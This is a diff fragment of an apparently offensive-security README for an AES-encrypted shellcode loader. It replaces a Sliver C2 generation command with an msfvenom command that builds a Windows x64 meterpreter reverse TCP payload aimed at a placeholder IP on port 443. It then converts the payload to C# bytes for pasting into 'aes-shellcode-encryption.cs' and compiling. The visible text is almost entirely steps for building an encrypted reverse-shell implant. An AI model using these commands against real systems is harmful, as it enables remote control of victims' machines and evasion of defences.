@@ -10,13 +10,13 @@
 
 **1. Generate shellcode:**
 ```bash
-sliver > generate --mtls <IP>:443 --format shellcode --save /tmp/sc.bin
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=443 -f raw -o /tmp/sc.bin
 msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f csharp -o /tmp/sc.cs
 ```
 
 **2. Replace the shellcode bytes in `aes-shellcode-encryption.cs`:**
 ```csharp
-byte[] shellcode = new byte[] { 0xfc, 0x48, 0x83, ... };  // ← paste your Sliver csharp output here
+byte[] shellcode = new byte[] { 0xfc, 0x48, 0x83, ... };  // ← paste your msfvenom csharp output here
 ```
 
 **3. Compile:**
